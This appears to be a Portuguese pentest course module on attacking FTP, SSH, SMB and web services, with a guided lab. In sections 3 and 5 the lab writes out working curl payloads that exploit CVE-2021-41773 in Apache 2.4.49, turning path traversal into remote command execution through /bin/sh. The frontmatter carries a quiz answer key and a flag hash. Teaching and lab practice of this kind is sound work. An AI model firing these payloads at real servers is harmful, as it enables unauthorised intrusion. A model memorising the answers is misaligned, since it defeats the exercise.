@@ -1,0 +1,716 @@
+---
+slug: ataque-a-servicos
+track: trilha-5
+title: "Ataque a serviços comuns"
+prerequisites: [enumeracao-de-servicos, netcat-e-shells]
+lab: vulhub
+tasks:
+  - slug: obter-foothold
+    title: "Obter o foothold e saquear o serviço"
+    type: flag
+    prompt: "Monte FLAG{conta-hash}: a conta de sistema sob a qual o serviço web executa os comandos que você mandar (o que o `id` mostra) e os 12 primeiros caracteres do SHA-256 do arquivo /etc/passwd lido pelo foothold. Formato: FLAG{conta-hash}."
+    hint: "O alvo é o Apache 2.4.49 do 5.1. O único caminho mapeado para fora da raiz é um ScriptAlias com CGI ligado — então a traversal não lê o arquivo, ela o executa. Use isso a seu favor: faça o servidor rodar os seus comandos. Quem é o `id`? Qual o `sha256sum` de /etc/passwd?"
+    flag:
+      hash: "scrypt$16384$8$1$e550c222d4973d0f9febaa0c513e8c07a6bcdf3b73b658d4a31c792970fae931"
+      salt: "5d3677f299dafd8f273d912e44985e08"
+  - slug: quiz-final
+    title: "Quiz — Ataque a serviços comuns"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "No alvo do lab, ler /etc/passwd pela traversal (`GET /cgi-bin/.%2e/.../etc/passwd`) devolve 500 Internal Server Error, não o conteúdo do arquivo. Por quê?"
+        options:
+          - "O arquivo /etc/passwd não existe no contêiner"
+          - "O /cgi-bin/ é um ScriptAlias com CGI ligado: tudo sob ele é tratado como script para EXECUTAR. A traversal até alcança o /etc/passwd, mas o Apache tenta executá-lo como CGI e falha — por isso 500, não o conteúdo"
+          - "O Apache 2.4.49 não é vulnerável a leitura de arquivo"
+          - "Faltou o cabeçalho Host na requisição"
+        answer: 1
+        explanation: "O 500 é a prova de que a traversal funcionou: ela chegou ao /etc/passwd. O que impede a leitura é o handler: o ScriptAlias /cgi-bin/ manda o mod_cgid executar o que for alcançado ali. Como /etc/passwd não é um CGI válido, o resultado é erro. Num servidor com um Alias comum (não-script), a mesma traversal devolveria o conteúdo (leitura). Aqui, o caminho natural é executar — e é isso que dá o foothold."
+      - question: "O foothold no lab roda como `uid=1(daemon)`, não como root. O que isso significa na prática?"
+        options:
+          - "O ataque falhou: sem root não há acesso"
+          - "daemon é um superusuário equivalente a root"
+          - "Acesso inicial não é controle total. Você executa comandos como a conta restrita do serviço; ler arquivos de root, por exemplo, ainda exige uma etapa de privilege escalation (Trilha 6). Rodar o serviço como conta sem privilégio foi uma boa prática que limitou o estrago"
+          - "O uid=1 indica que o servidor está em modo de manutenção"
+        answer: 2
+        explanation: "Ganhar um foothold é o começo, não o fim. Como o Apache estava rodando como daemon (uma conta de serviço sem privilégio), o atacante herda só o que daemon pode fazer. Isso é exatamente o que a defesa quer: least privilege transforma um RCE em 'controle de uma conta limitada', não do sistema. Chegar a root é outra fase (escalação de privilégio)."
+      - question: "Um servidor FTP aceita login com usuário `anonymous` e qualquer senha, expondo os arquivos. Como se classifica esse problema?"
+        options:
+          - "É uma configuração insegura (anonymous FTP ligado), não uma falha de código: o software funciona como projetado; quem o configurou deixou a porta aberta. A correção é de configuração, não de patch"
+          - "É uma CVE (falha no código do servidor FTP)"
+          - "É um ataque de força bruta"
+          - "Não é problema de segurança, é o padrão do FTP"
+        answer: 0
+        explanation: "Vale separar os três vetores: versão vulnerável (resolve-se com patch), credencial fraca/padrão (resolve-se trocando a senha e limitando tentativas) e má configuração (resolve-se mudando a config). FTP anônimo é o terceiro caso: nenhum bug foi explorado, só uma opção perigosa ligada. Confundir os três leva a 'corrigir' a coisa errada."
+      - question: "Por que o `curl` precisa da opção `--path-as-is` para esta exploração?"
+        options:
+          - "Para o curl usar HTTPS em vez de HTTP"
+          - "Para autenticar no servidor"
+          - "Para seguir redirecionamentos automaticamente"
+          - "Porque, por padrão, o curl normaliza o caminho antes de enviar: ele resolve os `../` e colapsa a traversal, mandando um caminho 'limpo'. Com --path-as-is, o curl envia o caminho cru (com `%2e` e `../`), e aí o bug de normalização do servidor é que decide o resultado"
+        answer: 3
+        explanation: "O bug está na normalização do SERVIDOR, então o caminho precisa chegar cru até ele. Sem --path-as-is, o próprio curl 'conserta' o caminho no cliente e o ataque nunca sai. É um erro clássico de quem está começando: testa, recebe 404/200 normal e acha que o alvo não é vulnerável, quando na verdade o cliente desarmou o payload."
+      - question: "O que é uma null session em SMB e por que ela interessa a um atacante?"
+        options:
+          - "Uma sessão SMB criptografada de ponta a ponta"
+          - "Uma conexão SMB sem autenticação (usuário e senha vazios) que, em sistemas mal configurados, ainda permite enumerar usuários, grupos e compartilhamentos — informação valiosa para o próximo passo do ataque"
+          - "Um erro que derruba o serviço SMB"
+          - "A sessão que o administrador usa para manutenção"
+        answer: 1
+        explanation: "A null session é o equivalente do FTP anônimo no mundo SMB: um acesso não autenticado que deveria entregar nada e, mal configurado, entrega o inventário do alvo (contas, shares). Não é RCE, é information disclosure — mas alimenta a enumeração e os ataques de senha. Sistemas modernos a restringem por padrão; os antigos, não."
+      - question: "Qual ação de fato CORRIGE a CVE-2021-41773 no alvo, e qual apenas reduz o impacto?"
+        options:
+          - "Esconder a versão com ServerTokens Prod corrige; atualizar é opcional"
+          - "Desligar o servidor é a única correção"
+          - "Atualizar para 2.4.51 ou mais novo corrige (remove o bug). Desligar o mod_cgid não corrige, mas reduz o impacto: sem CGI, a mesma traversal vira leitura de arquivo em vez de execução de código — menos grave, ainda uma falha"
+          - "Trocar a senha do root corrige a falha"
+        answer: 2
+        explanation: "A correção real é o patch: a 2.4.51 reescreve a normalização de caminho (a 2.4.50 não bastou — CVE-2021-42013). Desligar módulos não usados, como o CGI, é defesa em profundidade: degrada o pior caso (RCE) para um caso menos grave (leitura de arquivo), mas a falha continua. Esconder a versão é só cosmético. Boas práticas somam; nenhuma substitui atualizar."
+glossary:
+  - term: FTP
+    definition: "File Transfer Protocol: protocolo antigo de transferência de arquivos (porta 21 de controle), que por padrão trafega usuário, senha e dados em texto claro. Simples e onipresente, é um alvo clássico de enumeração e captura de credenciais."
+  - term: anonymous FTP
+    definition: "Configuração de um servidor FTP que aceita o usuário 'anonymous' com qualquer senha, liberando arquivos sem autenticação real. Útil para espelhos públicos, perigosa quando exposta por engano."
+  - term: SFTP
+    definition: "SSH File Transfer Protocol: transferência de arquivos por dentro de um túnel SSH (porta 22), com tudo cifrado. Substituto seguro do FTP; apesar do nome parecido, não tem relação com o FTP clássico."
+  - term: null session
+    definition: "Conexão SMB sem autenticação (usuário e senha vazios). Em sistemas mal configurados, permite enumerar usuários, grupos e compartilhamentos sem credencial — um vazamento de informação que alimenta o próximo passo do ataque."
+  - term: SMBv1
+    definition: "A primeira versão do protocolo SMB, de décadas atrás, cheia de defeitos de projeto e sem as proteções modernas. Foi o vetor do EternalBlue/WannaCry; a recomendação da Microsoft é desativá-la por completo."
+  - term: initial access
+    definition: "Acesso inicial (ou foothold, 'ponto de apoio'): o primeiro ponto de execução que o atacante conquista dentro de um alvo — normalmente como uma conta sem privilégio. É o fim da fase externa e o começo da interna (escalar privilégio, pivotar)."
+---
+
+import doServicoAoFoothold from "./img/do-servico-ao-foothold.svg";
+import traversalParaRce from "./img/traversal-para-rce.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 5.1 você aprendeu a parar diante de uma porta aberta e responder com precisão
+*"o que exatamente fala aqui?"* — o produto, a versão, os caminhos expostos. Este
+módulo é o passo que vem logo depois e muda tudo: transformar esse conhecimento
+em **acesso**. Sair de "há um Apache 2.4.49 rodando ali" para "estou executando
+comandos dentro daquela máquina". Essa travessia tem um nome na área —
+<GlossaryTerm term="initial access">acesso inicial</GlossaryTerm> (initial
+access), ou *foothold* — e é o momento em que um teste deixa de ser observação e
+vira intrusão.
+
+Serviços de rede são a porta da frente de quase todo alvo: um servidor web, um
+compartilhamento de arquivos, um acesso remoto. Três histórias deste módulo
+mostram o tamanho da aposta. Em 2017, o ransomware **WannaCry** se espalhou por
+mais de 150 países em horas usando **um único serviço** mal mantido (o SMB antigo
+do Windows). Em 2014, a operação **Windigo** manteve mais de 25 mil servidores
+sob controle por um backdoor no **SSH**. Em 2011, bastava digitar uma carinha
+`:)` no nome de usuário de certos servidores **FTP** para ganhar um shell. Em
+todos, o elo era um serviço comum — e quem entendia como atacá-lo entrava, quem
+entendia como defendê-lo ficava de fora.
+
+Neste módulo você vai estudar as quatro famílias de serviço que mais aparecem num
+pentest — <GlossaryTerm term="FTP">FTP</GlossaryTerm>,
+<GlossaryTerm term="SSH">SSH</GlossaryTerm>, <GlossaryTerm term="SMB">SMB</GlossaryTerm>
+e web — e os três caminhos que levam ao foothold: a **configuração insegura**, a
+**credencial fraca** e a **versão vulnerável**. Depois vai percorrer, no
+laboratório, o terceiro caminho de ponta a ponta contra o Apache 2.4.49 do 5.1,
+saindo de "versão vulnerável" até "executo comandos como o serviço".
+
+<Figure
+  src={doServicoAoFoothold}
+  alt="Fluxo da esquerda para a direita: um serviço exposto leva à enumeração (porta, versão, banner, módulo 5.1), que abre em três vetores empilhados — má configuração, credencial fraca ou padrão e versão vulnerável. Os três convergem para uma caixa destacada, o acesso inicial (foothold), em que se executam comandos como o usuário do serviço; dela sai a etapa de pós-foothold. Uma chave marca o foothold como o foco deste módulo, e uma nota lembra que a dissecação do CVE é o módulo 5.4."
+  caption="Enumerar (5.1) revela o alvo; três vetores diferentes levam ao mesmo lugar — o acesso inicial. Este módulo chega até o foothold; dissecar o CVE por dentro é o 5.4."
+/>
+
+**Ao final, você vai saber:**
+
+- reconhecer, em FTP, SSH, SMB e web, a diferença entre uma **má configuração**,
+  uma **credencial fraca** e uma **versão vulnerável** — e por que cada uma pede
+  uma correção diferente;
+- transformar uma versão vulnerável enumerada num **foothold**, fazendo um serviço
+  web executar comandos seus, e entender por que o alvo responde como responde;
+- **saquear** o serviço a partir do foothold (ler arquivos do sistema, descobrir
+  como e sob qual conta o serviço roda);
+- defender cada um desses serviços: o que desligar, o que atualizar, o que
+  monitorar — e por que rodar um serviço sem privilégio muda o estrago de um RCE.
+
+**Pré-requisitos:** 5.1 — Enumeração de serviços (você vai partir da versão e dos
+caminhos que enumerou lá) e 2.7 — Netcat e shells (os conceitos de
+<GlossaryTerm term="bind shell">bind shell</GlossaryTerm> e
+<GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>, que o foothold
+usa).
+
+**Tempo estimado:** 3 a 3,5 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Obter acesso a um serviço — mesmo "só" para provar que dá — é intrusão, e no
+Brasil pode se enquadrar no art. 154-A do Código Penal (invasão de dispositivo
+informático). Tudo aqui se faz **apenas** no laboratório local ou em um alvo com
+**autorização por escrito** no escopo (relembre o 1.3). Um foothold num sistema
+de terceiros sem permissão é crime, não demonstração.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O que é atacar um serviço: três caminhos para o mesmo lugar
+
+Um **serviço** (service) é um programa que escuta numa porta e fala um protocolo
+para atender clientes pela rede: o Apache na 80 fala HTTP, o OpenSSH na 22 fala
+SSH, o Samba na 445 fala SMB. Quase todo serviço faz duas coisas que interessam
+ao atacante: ele **expõe funcionalidade** (servir páginas, arquivos, um shell) e,
+em geral, ele **autentica** quem pede. Atacar um serviço é subverter uma dessas
+duas coisas para conseguir fazer o que você não deveria — no limite, executar
+comandos na máquina que o hospeda.
+
+Há exatamente três caminhos para isso, e distingui-los é metade do trabalho de um
+pentester, porque cada um se corrige de um jeito diferente:
+
+1. **Configuração insegura.** O software está íntegro e atualizado, mas foi
+   **configurado** de um jeito que abre a porta: um FTP que aceita
+   <GlossaryTerm term="anonymous FTP">anonymous</GlossaryTerm>, um SMB que
+   responde a <GlossaryTerm term="null session">null session</GlossaryTerm>, um
+   servidor web que lista diretórios. Ninguém explorou um bug; alguém deixou uma
+   opção perigosa ligada. **Corrige-se mudando a configuração.**
+2. **Credencial fraca ou padrão.** O serviço exige senha, mas a senha é
+   `admin/admin`, ou foi deixada no padrão de fábrica, ou é curta o bastante para
+   cair num <GlossaryTerm term="brute force">brute force</GlossaryTerm> (tentar
+   muitas senhas) ou num <GlossaryTerm term="password spraying">password
+   spraying</GlossaryTerm> (tentar uma senha comum em muitas contas).
+   **Corrige-se com senha forte, MFA e limite de tentativas.**
+3. **Versão vulnerável.** O software tem um bug conhecido — uma
+   <GlossaryTerm term="CVE">CVE</GlossaryTerm> — que aquela versão carrega.
+   Explorá-lo pode dar desde leitura de arquivo até
+   <GlossaryTerm term="remote code execution">execução remota de código</GlossaryTerm>
+   (RCE). **Corrige-se com patch (atualizar).**
+
+Os três terminam no mesmo lugar: o **acesso inicial**. Vale fixar a palavra: um
+foothold quase nunca é "virei dono do servidor". É executar comandos como a conta
+restrita que roda o serviço. Dali começa outra jornada — escalar privilégio e
+pivotar —, que são a Trilha 6. Confundir "tenho um foothold" com "tenho o
+controle" é um erro de principiante.
+
+As próximas quatro subseções olham cada família de serviço por essa lente.
+
+### 2.2 FTP — a transferência de arquivos que nasceu sem segredo
+
+O <GlossaryTerm term="FTP">FTP</GlossaryTerm> (File Transfer Protocol) é um dos
+protocolos mais antigos da internet. Ele usa a porta 21 para o canal de controle
+(comandos como `USER`, `PASS`, `LIST`) e abre outra conexão para os dados. O
+problema de projeto é que **tudo trafega em texto claro**: quem captura o tráfego
+(relembre o Wireshark do 2.6) lê o usuário e a senha diretamente. É por isso que o
+FTP foi largamente substituído pelo <GlossaryTerm term="SFTP">SFTP</GlossaryTerm>
+(transferência por dentro de um túnel SSH, tudo cifrado).
+
+As configurações inseguras clássicas do FTP são duas. A primeira é o
+<GlossaryTerm term="anonymous FTP">anonymous FTP</GlossaryTerm>: o servidor aceita
+o usuário `anonymous` com qualquer senha e entrega os arquivos sem autenticação.
+Faz sentido para um espelho público de downloads; é desastre quando foi ligado por
+engano num servidor interno. A segunda é a própria senha fraca no canal em texto
+claro. Enumerar um FTP é rápido: o banner já entrega o produto e a versão (`220
+(vsFTPd 3.0.3)`), e um `nmap --script ftp-anon` testa o anonymous em um disparo.
+
+### 2.3 SSH — o acesso remoto seguro que a configuração pode estragar
+
+O <GlossaryTerm term="SSH">SSH</GlossaryTerm> (Secure Shell), na porta 22, é o
+oposto do FTP no quesito sigilo: ele cifra tudo e é a forma padrão de administrar
+máquinas Unix remotamente. A criptografia do SSH raramente é o problema — o
+problema é **como ele autentica**. Três configurações o enfraquecem:
+
+- **Login por senha ligado e exposto à internet.** Um SSH que aceita senha vira
+  alvo de brute force e de password spraying constantes. A defesa é autenticar por
+  <GlossaryTerm term="SSH key">chave</GlossaryTerm> (um par criptográfico, não uma
+  senha) e desligar o login por senha.
+- **Login de root permitido.** Deixar `PermitRootLogin yes` significa que uma
+  única senha correta entrega a conta mais poderosa da máquina. A prática é
+  proibir o login direto de root.
+- **Credenciais fracas, reusadas ou vazadas.** Se a senha é adivinhável, ou se a
+  chave privada vazou (em um repositório Git, por exemplo), nenhuma criptografia
+  ajuda.
+
+O SSH é o caso em que "o serviço é seguro" e "a instalação é segura" são coisas
+diferentes: o software é sólido, mas uma configuração frouxa o abre.
+
+### 2.4 SMB — o compartilhamento de arquivos do Windows (e o seu histórico)
+
+O <GlossaryTerm term="SMB">SMB</GlossaryTerm> (Server Message Block) é o protocolo
+de compartilhamento de arquivos e impressoras do mundo Windows (e do Samba, no
+Linux), hoje nas portas 445 e 139. É um serviço riquíssimo em superfície, e por
+isso um dos mais atacados. Dois pontos importam aqui.
+
+O primeiro é a <GlossaryTerm term="null session">null session</GlossaryTerm>: uma
+conexão sem usuário nem senha que, em sistemas mal configurados, ainda permite
+**enumerar** contas, grupos e compartilhamentos. É o equivalente do anonymous FTP
+— não executa nada, mas entrega o mapa interno do alvo de graça. Ferramentas como
+`enum4linux` e `smbclient -N` exploram isso.
+
+O segundo é o peso do legado. O <GlossaryTerm term="SMBv1">SMBv1</GlossaryTerm>, a
+primeira versão do protocolo, é cheio de defeitos de projeto e foi o vetor de um
+dos maiores incidentes da história (o EternalBlue/WannaCry da seção 4). A
+recomendação da própria Microsoft é **desativá-lo por completo**; ainda assim,
+anos depois, ele aparece em redes reais. SMB junta, num só serviço, os três
+vetores: má configuração (null session), versão vulnerável (SMBv1) e credenciais
+fracas.
+
+### 2.5 Web — o serviço mais exposto, e o do nosso lab
+
+O serviço web (HTTP, na 80/443) é o mais exposto do planeta, e todo o seu ataque
+na camada da aplicação é a Trilha 4. Aqui o olhar é diferente: tratamos o servidor
+web como **mais um serviço**, atacável pelos mesmos três caminhos. Má configuração
+(métodos perigosos como `PUT`, <GlossaryTerm term="directory listing">directory
+listing</GlossaryTerm>, páginas de admin expostas); credencial padrão (o
+`admin/admin` de um painel); e **versão vulnerável** — uma CVE no próprio servidor,
+não na aplicação.
+
+É esse terceiro caso que o laboratório explora. O alvo é o mesmo Apache **2.4.49**
+que você enumerou no 5.1: uma versão com a CVE-2021-41773, um
+<GlossaryTerm term="path traversal">path traversal</GlossaryTerm> (uma falha que
+permite sair da pasta pública e alcançar outros caminhos do sistema) que, quando o
+<GlossaryTerm term="CGI">CGI</GlossaryTerm> está ligado, vira RCE. Você vai usá-la
+como caixa-preta para ganhar o foothold; **por que** exatamente os bytes do
+payload funcionam, as variações e o patch são o módulo 5.4.
+
+## 3. Como o ataque funciona — a mecânica
+
+A receita de um ataque a serviço é sempre a mesma esteira: **enumerar** (5.1) →
+**escolher o vetor** (config, credencial ou versão) → **obter o foothold** →
+**saquear**. Todos os comandos abaixo foram rodados de verdade contra o alvo do
+lab; as saídas são reais (com o endereço do meu ambiente trocado por um genérico).
+
+**Passo 1 — confirmar o alvo (enumeração do 5.1).** Você já sabe o que esperar,
+mas sempre reconfirme a versão, porque é ela que decide o vetor:
+
+```console
+$ nmap -Pn -sT -sV -p80 vulhub
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-16 01:23 +0000
+Nmap scan report for vulhub (172.20.0.3)
+Host is up (0.000016s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
+```
+
+Repare no `-sT` (TCP connect scan). O Kali do lab roda como um usuário sem
+privilégio e não pode abrir *raw sockets*; sem o `-sT`, o `nmap -sV` tenta um SYN
+scan e falha com `Couldn't open a raw socket`. É um detalhe real do ambiente, e um
+bom lembrete de que nem todo scan precisa de root.
+
+`Apache httpd 2.4.49` é a chave. No 5.1 você fez a ponte dessa versão até a
+CVE-2021-41773, que a CISA marca como **explorada no mundo real** no catálogo
+<GlossaryTerm term="KEV">KEV</GlossaryTerm>. O vetor, portanto, é "versão
+vulnerável".
+
+**Passo 2 — a primeira tentativa, e o que o 500 ensina.** A CVE-2021-41773 é um
+path traversal. A tentativa mais óbvia é usá-la para **ler** um arquivo fora da
+raiz, como o `/etc/passwd`. O caminho mapeado para fora da pasta pública, neste
+servidor, é o `/cgi-bin/`. Vamos tentar lê-lo — com o `curl` e, crucialmente, com
+`--path-as-is`:
+
+```console
+$ curl -sS -i --path-as-is 'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+HTTP/1.1 500 Internal Server Error
+Date: Fri, 16 Oct 2026 01:24:44 GMT
+Server: Apache/2.4.49 (Unix)
+Content-Length: 528
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+...
+```
+
+Um `500 Internal Server Error` — não o conteúdo do arquivo. É tentador concluir
+que o alvo não é vulnerável; seria o erro errado. O 500 é, na verdade, a **prova**
+de que a traversal funcionou: ela chegou ao `/etc/passwd`. O que aconteceu é que o
+`/cgi-bin/` não é um caminho qualquer — é um **ScriptAlias**, uma área cujo
+conteúdo o Apache **executa** como programa (CGI). Ao alcançar o `/etc/passwd` por
+ali, o Apache não o leu: ele tentou **executá-lo** como se fosse um script, e
+falhou (um arquivo de texto não é um programa válido). Daí o 500.
+
+Essa é a diferença que define o lab: num servidor com um `Alias` comum (não-script)
+apontando para fora da raiz, a mesma traversal **leria** o arquivo. Aqui, o único
+caminho disponível **executa** — então o caminho natural não é ler, é **rodar
+comando**. O "erro" é o mapa do tesouro.
+
+**Passo 3 — de traversal a execução de comando.** Se o `/cgi-bin/` executa o que
+for alcançado, basta alcançar um **interpretador** — o `/bin/sh` — e mandar o
+comando no corpo da requisição (um `POST`). Essa é a forma de RCE da
+CVE-2021-41773:
+
+```console
+$ curl -sS --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Pare e repare no que aconteceu: o servidor executou o seu `id` e devolveu o
+resultado. **Isto é o foothold.** O corpo do `-d` é um pequeno script de shell: o
+`echo Content-Type...` seguido de um `echo` vazio produz os cabeçalhos mínimos que
+o CGI exige, e depois vem o seu comando (`id`). A saída, `uid=1(daemon)`, diz sob
+qual conta você está: o <GlossaryTerm term="service account">serviço</GlossaryTerm>
+roda como `daemon`, uma conta **sem privilégio**. Você executa comandos — mas os
+dela, não os de root.
+
+<Figure
+  src={traversalParaRce}
+  alt="O Kali envia um POST com curl --path-as-is para /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh, com o comando no corpo. Dentro do Apache 2.4.49, três passos: 1, casa o prefixo /cgi-bin/ como ScriptAlias e decide executar; 2, normaliza o %2e depois de checar o caminho, então o ../ escapa da pasta pública; 3, alcança o /bin/sh e o mod_cgid executa o corpo como comando. A resposta devolve a saída do comando, executado como o usuário daemon."
+  caption="A visão caixa-preta: por que um POST com caminho cru vira execução de comando. O bug está na ordem (checar o caminho, depois normalizar o %2e); o detalhe byte a byte é o módulo 5.4."
+/>
+
+A opção `--path-as-is` é o que torna tudo possível do lado do cliente, e é um
+tropeço comum: por padrão, o `curl` **normaliza** o caminho antes de enviar — ele
+mesmo resolve os `../` e entrega um caminho "limpo", desarmando o payload. Com
+`--path-as-is`, o caminho sai cru (`%2e` e `../` intactos), e aí quem decide é o
+bug de normalização do **servidor**. Sem essa opção, você testaria e concluiria,
+errado, que o alvo é seguro.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+As três famílias de serviço não-web deste módulo têm, cada uma, um incidente de
+referência. (A família web é a própria CVE-2021-41773, cuja linha do tempo você
+viu no 5.1.)
+
+### FTP — o backdoor do vsftpd 2.3.4 (2011)
+
+O <GlossaryTerm term="FTP">FTP</GlossaryTerm> `vsftpd` é um dos servidores mais
+usados no Linux. Entre **30 de junho e 1º de julho de 2011**, um atacante
+desconhecido substituiu o pacote `vsftpd-2.3.4.tar.gz` no site oficial por uma
+versão com um <GlossaryTerm term="backdoor">backdoor</GlossaryTerm>. O gatilho era
+absurdamente simples: bastava incluir uma carinha `:)` no nome de usuário do
+login FTP para que o servidor abrisse um shell de comando escutando na porta TCP
+**6200**. Nas palavras do mantenedor, Chris Evans, que o descobriu: *"In response
+to a :) smiley face in the FTP username, a TCP callback shell is attempted."* O
+pacote adulterado foi removido em **3 de julho de 2011**.
+
+- **Impacto:** qualquer um que baixou e instalou aquele pacote ficou com uma porta
+  dos fundos trivial de acionar. Virou um dos exercícios mais conhecidos de
+  introdução a pentest (há um módulo pronto no Metasploit, que você verá no 5.3).
+- **Lição:** o risco de um serviço não está só na sua configuração — está também
+  na **cadeia de suprimentos** (supply chain). Verificar a integridade do que se
+  baixa (hashes, assinaturas) é parte de operar um serviço com segurança.
+- **Fontes:** [scarybeastsecurity — Alert: vsftpd download backdoored](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
+  e [Rapid7 — VSFTPD v2.3.4 Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/).
+
+### SSH — a Operação Windigo e o backdoor Ebury (2014)
+
+Em **março de 2014**, a ESET publicou a análise da **Operação Windigo**, uma
+campanha que havia comprometido **mais de 25 mil servidores** ao longo de cerca de
+dois anos (com mais de 10 mil ainda infectados na data do relatório). O coração da
+operação era o **Linux/Ebury**, descrito pela ESET como *"a clever OpenSSH backdoor
+and credential stealer"* — um backdoor embutido no <GlossaryTerm term="SSH">SSH</GlossaryTerm>
+que dava acesso contínuo aos servidores e **roubava as credenciais** de quem se
+conectava, propagando o controle de máquina em máquina. No pico, a infraestrutura
+redirecionava quase **500 mil visitantes web por dia** e enviava mais de **35
+milhões de spams por dia**.
+
+- **Impacto:** 25 mil servidores Unix sob controle de um único grupo, usados para
+  spam, redirecionamento malicioso e roubo de mais credenciais — um efeito em
+  cascata, já que cada servidor comprometido entregava as chaves do próximo.
+- **Lição:** o SSH é o acesso mais poderoso de uma máquina Unix; comprometê-lo é
+  comprometer tudo. Autenticação por chave, proibição de login de root e detecção
+  de binários adulterados do OpenSSH são defesas de primeira linha.
+- **Fonte:** [ESET / WeLiveSecurity — Operation Windigo](https://www.welivesecurity.com/2014/03/18/operation-windigo-the-vivisection-of-a-large-linux-server-side-credential-stealing-malware-campaign/).
+
+### SMB — EternalBlue e o WannaCry (2017)
+
+É o caso mais pesado. Em **14 de março de 2017**, a Microsoft publicou o boletim
+**MS17-010**, *Critical*, corrigindo várias falhas de execução remota de código no
+<GlossaryTerm term="SMBv1">SMBv1</GlossaryTerm> (as CVEs 2017-0143 a 2017-0148).
+Uma delas, a **CVE-2017-0144**, era explorada por uma ferramenta da NSA chamada
+**EternalBlue**. Em **14 de abril de 2017**, o grupo Shadow Brokers vazou o
+EternalBlue publicamente. E em **12 de maio de 2017** (uma sexta-feira), o
+ransomware **WannaCry** o usou para se espalhar sozinho, de máquina em máquina,
+por **mais de 150 países** e mais de 200 mil computadores.
+
+No Reino Unido, o relatório oficial do National Audit Office documentou o estrago
+no sistema de saúde (NHS): **pelo menos 81 das 236 *trusts*** da Inglaterra foram
+afetadas, além de 603 organizações de atenção primária; **6.912 consultas foram
+confirmadas como canceladas** entre 12 e 18 de maio, com uma estimativa de mais de
+**19 mil** no total. A causa comum: sistemas Windows **sem o patch** (que já estava
+disponível havia quase dois meses) e com o serviço SMB exposto.
+
+- **Impacto:** paralisação de hospitais, fábricas e empresas no mundo todo, a
+  partir de **um serviço** desatualizado e alcançável pela rede.
+- **Lição:** o intervalo entre "patch disponível" e "exploração em massa" se mede
+  em semanas; e um protocolo legado que deveria ter sido desativado (SMBv1) é uma
+  bomba-relógio. Atualizar e **reduzir superfície** não é higiene opcional.
+- **Fontes:** [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
+  e [UK National Audit Office — Investigation: WannaCry cyber attack and the NHS](https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá convertido a versão vulnerável enumerada no
+5.1 em um **foothold** — executando os seus comandos no alvo — e usado esse
+foothold para saquear o serviço: descobrir sob qual conta ele roda e ler um
+arquivo do sistema que não é servido pela web. Com esses dois fatos você monta a
+flag `FLAG{conta-hash}`. O alvo é o lab **vulhub** (o Apache 2.4.49 do 5.1).
+
+<Callout variant="warning">
+Um laboratório ativo por vez (regra dos 16 GB). Se outro lab estiver rodando,
+pare-o antes. O alvo do `vulhub` só é alcançável de dentro do Kali, pelo nome
+`vulhub` — ele não tem internet e não enxerga o seu PC.
+</Callout>
+
+<Callout variant="info" title="O que este lab NÃO cobre (de propósito)">
+Aqui você usa o exploit da CVE-2021-41773 como **caixa-preta**: o objetivo é o
+foothold e o que se faz com ele. **Por que** os bytes `.%2e/%2e%2e/` furam a
+normalização, as variações (a 2.4.50 que não bastou) e o patch são o módulo 5.4; o
+mesmo ataque feito pelo Metasploit, em vez de na mão, é o 5.3.
+</Callout>
+
+### 5.1 Subir o laboratório e confirmar o alvo
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar** e
+   espere o Kali abrir na tela.
+2. No Kali, abra um terminal e confirme que alcança o alvo e qual é a versão:
+
+```console
+$ curl -s -o /dev/null -w "HTTP %{http_code}\n" http://vulhub/
+HTTP 200
+$ nmap -Pn -sT -sV -p80 vulhub | grep -i apache
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+```
+
+Se vier `Apache httpd 2.4.49`, você está diante da versão com a CVE-2021-41773 do
+KEV. (Pelo terminal do WSL, a alternativa é `scripts/lab.sh up vulhub`.)
+
+### 5.2 Primeiro passo guiado — provar a traversal
+
+Antes de executar nada, prove que a falha está ali. Peça ao servidor um arquivo
+que mora **fora** da pasta pública, pelo `/cgi-bin/`, lembrando do `--path-as-is`:
+
+```console
+$ curl -sS -o /dev/null -w "%{http_code}\n" --path-as-is \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+500
+```
+
+Um `500`. Como vimos na seção 3, esse erro é a confirmação de que a traversal
+alcançou o `/etc/passwd` — e de que o `/cgi-bin/` **executa** o que alcança, em vez
+de ler. Guarde essa pista: ela diz qual é o caminho para o foothold.
+
+### 5.3 Desafio A — ganhar o foothold
+
+**Seu objetivo:** parar de tentar *ler* e começar a *executar*. Se o `/cgi-bin/`
+roda como CGI tudo o que alcança, faça a traversal alcançar um **interpretador de
+comandos** e peça a ele que rode algo simples — o `id`, para saber quem você é. A
+conta que o `id` devolver é a **primeira parte** da flag.
+
+<Hint title="Dica 1">
+O interpretador de shell do sistema fica em `/bin/sh`. Em vez de terminar a
+traversal em `/etc/passwd`, termine em `/bin/sh`. E, para um CGI rodar, o comando
+precisa ir no **corpo** da requisição (um `POST`): no `curl`, isso é a opção `-d`.
+</Hint>
+
+<Hint title="Dica 2">
